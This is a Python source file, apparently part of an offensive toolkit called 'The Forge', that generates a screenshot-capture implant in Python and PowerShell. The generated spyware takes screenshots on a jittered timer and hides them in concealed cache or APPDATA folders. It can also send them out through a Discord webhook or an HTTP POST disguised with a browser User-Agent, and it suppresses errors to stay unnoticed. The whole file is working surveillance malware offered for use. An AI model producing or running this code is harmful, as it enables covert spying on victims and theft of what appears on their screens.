"""
The Forge — Screenshot Capture Implant
Periodic screenshot capture with C2 exfiltration.
"""

import textwrap


def generate_python_screencap(
    interval: int = 30,
    exfil_method: str = "file",
    save_dir: str = "~/.cache/.caps",
    webhook_url: str = "",
    quality: int = 50,
    max_captures: int = 100
) -> str:
    """
    Python screenshot capturer.
    
    Exfil methods: file, discord, http
    """
    
    exfil_code = ""
    if exfil_method == "discord":
        exfil_code = textwrap.dedent(f"""\
            def exfil(img_bytes, filename):
                try:
                    import urllib.request
                    boundary="----FormBoundary"+os.urandom(8).hex()
                    body=(
                        f"--{{boundary}}\\r\\n"
                        f'Content-Disposition: form-data; name="file"; filename="{{filename}}"\\r\\n'
                        f"Content-Type: image/jpeg\\r\\n\\r\\n"
                    ).encode()+img_bytes+(
                        f"\\r\\n--{{boundary}}--\\r\\n"
                    ).encode()
                    req=urllib.request.Request("{webhook_url}",data=body,
                        headers={{"Content-Type":f"multipart/form-data; boundary={{boundary}}"}})
                    urllib.request.urlopen(req,timeout=15)
                except:pass
        """)
    elif exfil_method == "http":
        exfil_code = textwrap.dedent(f"""\
            def exfil(img_bytes, filename):
                try:
                    import urllib.request,base64
                    encoded=base64.b64encode(img_bytes)
                    req=urllib.request.Request("{webhook_url}",data=encoded,
                        headers={{"Content-Type":"application/octet-stream",
                                 "X-Filename":filename,
                                 "User-Agent":"Mozilla/5.0"}})
                    urllib.request.urlopen(req,timeout=15)
                except:pass
        """)
    else:
        exfil_code = textwrap.dedent(f"""\
            def exfil(img_bytes, filename):
                try:
                    save_path=os.path.expanduser("{save_dir}")
                    os.makedirs(save_path,exist_ok=True)
                    filepath=os.path.join(save_path,filename)
                    with open(filepath,"wb") as f:
                        f.write(img_bytes)
                    # Cleanup old captures
                    files=sorted(os.listdir(save_path))
                    while len(files)>{max_captures}:
                        os.remove(os.path.join(save_path,files.pop(0)))
                except:pass
        """)

    code = textwrap.dedent(f"""\
        import os,sys,time,io
        from datetime import datetime

        INTERVAL={interval}
        QUALITY={quality}

        {exfil_code}

        def capture():
            try:
                from PIL import ImageGrab
            except ImportError:
                import subprocess
                subprocess.check_call([sys.executable,"-m","pip","install","Pillow","-q"])
                from PIL import ImageGrab
            
            try:
                screenshot=ImageGrab.grab()
                buf=io.BytesIO()
                screenshot.save(buf,format="JPEG",quality=QUALITY,optimize=True)
                img_bytes=buf.getvalue()
                buf.close()
                
                timestamp=datetime.now().strftime("%Y%m%d_%H%M%S")
                filename=f"cap_{{timestamp}}.jpg"
                
                exfil(img_bytes,filename)
                return True
            except Exception:
                return False

        def capture_active_window():
            \"\"\"Capture only the active window (Windows only).\"\"\"
            try:
                import ctypes
                from PIL import ImageGrab
                
                hwnd=ctypes.windll.user32.GetForegroundWindow()
                rect=ctypes.wintypes.RECT()
                ctypes.windll.user32.GetWindowRect(hwnd,ctypes.byref(rect))
                
                screenshot=ImageGrab.grab(bbox=(rect.left,rect.top,rect.right,rect.bottom))
                buf=io.BytesIO()
                screenshot.save(buf,format="JPEG",quality=QUALITY)
                img_bytes=buf.getvalue()
                buf.close()
                
                timestamp=datetime.now().strftime("%Y%m%d_%H%M%S")
                filename=f"win_{{timestamp}}.jpg"
                exfil(img_bytes,filename)
                return True
            except:
                return capture()  # Fallback to full screen

        def main():
            import random
            while True:
                capture()
                jitter=INTERVAL*0.3
                sleep_time=INTERVAL+random.uniform(-jitter,jitter)
                time.sleep(max(5,sleep_time))

        if __name__=="__main__":
            main()
    """)
    return code


def generate_powershell_screencap(
    interval: int = 30,
    save_dir: str = "$env:APPDATA\\.caps"
) -> str:
    """PowerShell screenshot capturer."""
    return textwrap.dedent(f"""\
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $saveDir="{save_dir}"
        if(-not(Test-Path $saveDir)){{New-Item -ItemType Directory -Path $saveDir -Force|Out-Null}}
        while($true){{
            try{{
                $bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap=New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height)
                $graphics=[System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size)
                $timestamp=Get-Date -Format "yyyyMMdd_HHmmss"
                $filepath=Join-Path $saveDir "cap_$timestamp.jpg"
                $bitmap.Save($filepath,[System.Drawing.Imaging.ImageFormat]::Jpeg)
                $graphics.Dispose()
                $bitmap.Dispose()
                # Cleanup old files (keep last 100)
                $files=Get-ChildItem $saveDir -Filter "*.jpg"|Sort-Object Name
                if($files.Count -gt 100){{
                    $files[0..($files.Count-101)]|Remove-Item -Force
                }}
            }}catch{{}}
            Start-Sleep -Seconds {interval}
        }}
    """).strip()


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "python": generate_python_screencap,
    "powershell": generate_powershell_screencap,
}


def generate(language: str = "python", **kwargs) -> str:
    gen_func = VARIANTS.get(language.lower())
    if not gen_func:
        raise ValueError(f"Unknown language: {language}. Available: {list(VARIANTS.keys())}")
    return gen_func(**kwargs)


def list_variants() -> list[str]:
    return list(VARIANTS.keys())
